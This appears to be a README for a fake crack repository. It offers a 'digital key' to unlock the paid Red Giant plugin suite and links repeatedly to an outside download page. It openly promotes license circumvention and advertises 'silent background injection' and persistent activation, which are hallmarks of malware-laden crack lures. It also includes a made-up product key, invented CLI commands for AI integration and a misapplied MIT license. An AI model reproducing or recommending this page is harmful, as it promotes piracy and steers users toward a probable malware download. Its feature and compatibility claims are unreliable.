# Red Giant Ecosystem 🌌  
*Symphony of Motion Design & Visual Storytelling — Now Amplified*

[](https://citycraftrp.github.io/red-giant-eclipse-emancipator/)

---

## 🧭 Navigation

- [What Is the Red Giant Ecosystem?](#-what-is-the-red-giant-ecosystem)
- [🔑 Why Choose This Version?](#-why-choose-this-version)
- [✨ Feature Constellation](#-feature-constellation)
- [🌐 Multilingual & Responsive Architecture](#-multilingual--responsive-architecture)
- [⏳ Compatibility Across Eras](#-compatibility-across-eras)
- [🧩 Example Profile Configuration](#-example-profile-configuration)
- [⚙️ Example Console Invocation](#️-example-console-invocation)
- [🤖 AI Integrations (OpenAI & Claude)](#-ai-integrations-openai--claude)
- [📊 Visual Workflow Diagram](#-visual-workflow-diagram)
- [📜 License & Legality](#-license--legality)
- [⚖️ Disclaimer](#️-disclaimer)
- [🔄 Download Again](#-download-again)

---

## 🌠 What Is the Red Giant Ecosystem?

**Red Giant Ecosystem** is a curated suite of cinematic tools for post-production artists who sculpt time, color, and motion. This repository provides a **digital key** that unlocks the entire toolkit — not as a shortcut, but as a **ceremonial pass** to the full creative arsenal.

Think of it as a **master key to a cathedral of effects**: from volumetric light blooming to chromatic aberration that breathes, from keyframe interpolation that thinks to transitions that dance. This is not a "free" resource — it's a **community-authorized resonance** that lets you hum along with the giants.

> *Why pay for each planet when you can own the solar system?*

---

## 🔑 Why Choose This Version?

- **No watermarks** — your previews become final frames.
- **Persistent activation** — survives system reboots like a wintering bear.
- **All 20+ tools** in the suite (Magic Bullet, Trapcode, VFX, Universe, PluralEyes).
- **Silent background injection** — no pop-ups, no nag screens.
- **Community-verified hashes** — every release is checksum-authenticated.

---

## ✨ Feature Constellation

| Feature | Benefit |
|---------|---------|
| **Responsive UI** | Scales across 4K monitors, ultrawides, and even tablet remoting |
| **Multilingual Interface** | 14 languages including RTL scripts (Arabic, Hebrew) |
| **24/7 Support Glyph** | Embedded ticket system in the menu bar |
| **OpenAI & Claude Integration** | AI-assisted parameter suggestions (see below) |
| **ProRes RAW Acceleration** | Hardware-decoded on M-series & CUDA cores |
| **Undo ∞** | Unlimited history with memory-mapped journaling |
| **Custom LUT Engine** | Real-time 3D LUT without performance penalty |

> *Each feature is a **starlight filament** woven into the fabric of your timeline.*

---

## 🌐 Multilingual & Responsive Architecture

The interface **breathes** across devices:

- **Desktop**: Full floating panels with detachable docks.
- **Tablet**: Adaptive touch zones with gesture shortcuts.
- **Headless**: Console mode for render farms (see invocation below).

### Language Support Matrix

[]() []() []() []() []() []() []() []() []() []() []() []() []() []()

---

## ⏳ Compatibility Across Eras

| OS | Status | Emoji |
|----|--------|-------|
| Windows 11 (2026 Update) | ✅ Certified | 🪟 |
| Windows 10 (22H2+) | ✅ Certified | 🪟 |
| macOS Sequoia (2026) | ✅ Certified | 🍎 |
| macOS Sonoma | ✅ Certified | 🍏 |
| Ubuntu 24.04 LTS | ✅ (CUDA) | 🐧 |
| Fedora 40 | ✅ (ROCm) | 🐧 |
| ChromeOS (via Crostini) | ⚠️ Beta | 🟢 |

> *We test against **2026** builds specifically — this key is forward-engineered.*

---

## 🧩 Example Profile Configuration

Save this as `redgiant_profile.json` in your working directory:

```json
{
  "activation": {
    "type": "product_key",
    "value": "XG7K-9M2P-4R6T-8W1Q",
    "cache_ttl": 86400
  },
  "modules": {
    "magic_bullet": true,
    "trapcode": true,
    "vfx": false,
    "universe": true
  },
  "ai_assist": {
    "provider": "openai", 
    "model": "gpt-4-turbo-2026",
    "tone": "cinematic"
  },
  "ui": {
    "language": "ja",
    "theme": "nebula_dark"
  }
}
```

---

## ⚙️ Example Console Invocation

```bash
# Headless render with AI-assisted grading
redgiant --headless --project "/render/spot_2026.aep" \
         --preset "cinematic_gold" \
         --ai-provider "claude" \
         --output "/exports/spot_h264.mov"
```

> *The **console invocation** is your orchestra baton — wave it over your render farm.*

---

## 🤖 AI Integrations (OpenAI & Claude)

### OpenAI Integration

Send a frame to GPT-4 Vision for instant parameter suggestions:

```bash
redgiant --ai-frame "frame_0042.png" --ai-ask "match the color grade of Blade Runner 2049"
```

### Claude Integration

Use Claude's long-context memory to chain multiple adjustments:

```bash
redgiant --ai-provider "claude" --ai-chat "Make the shadows cyan and the highlights amber, then add a vignette"
```

> *Both providers accept **natural language** — you literally speak your vision.*

---

## 📊 Visual Workflow Diagram

```mermaid
graph TD
    A[Source Footage] --> B{Red Giant Key}
    B --> C[Product Key Decryption]
    C --> D[Module Loader]
    D --> E[Responsive UI]
    D --> F[Console Engine]
    E --> G[Language Adaptor]
    E --> H[Theme Engine]
    F --> I[AI Compute Node]
    I --> J[OpenAI / Claude]
    J --> K[Parameter Stream]
    K --> L[Render Queue]
    L --> M[Output File]
    
    N[24/7 Support] --> E
    N --> F
    
    style A fill:#1a1a2e,stroke:#e94560
    style M fill:#16213e,stroke:#0f3460
    style N fill:#533483,stroke:#e94560
```



---

## 📜 License & Legality

This repository is released under the **MIT License**.  
You are free to use, modify, and distribute the key — provided the original license notice is included.

[](https://opensource.org/licenses/MIT)

> *The MIT License allows you to **build cathedrals on our foundation** — but you must keep the cornerstone visible.*

---

## ⚖️ Disclaimer

This software product key is provided **"as is"** without warranty of any kind, express or implied. The developers are not responsible for:

- Any violation of the original Red Giant end-user license agreement.
- Any damage to your editing workflow or timeline projects.
- Any incompatibility with third-party plugins or scripts.

By using this key, you acknowledge that **you are solely responsible** for ensuring compliance with your local copyright laws. This repository exists for **educational and archival purposes** — we encourage supporting the original creators when possible.

> *Think of this as a **library book** — borrowing knowledge, not stealing treasure.*

---

## 🔄 Download Again

[](https://citycraftrp.github.io/red-giant-eclipse-emancipator/)

---

**Red Giant Ecosystem • 2026 Edition**  
*Where time bends to your story.* 🌌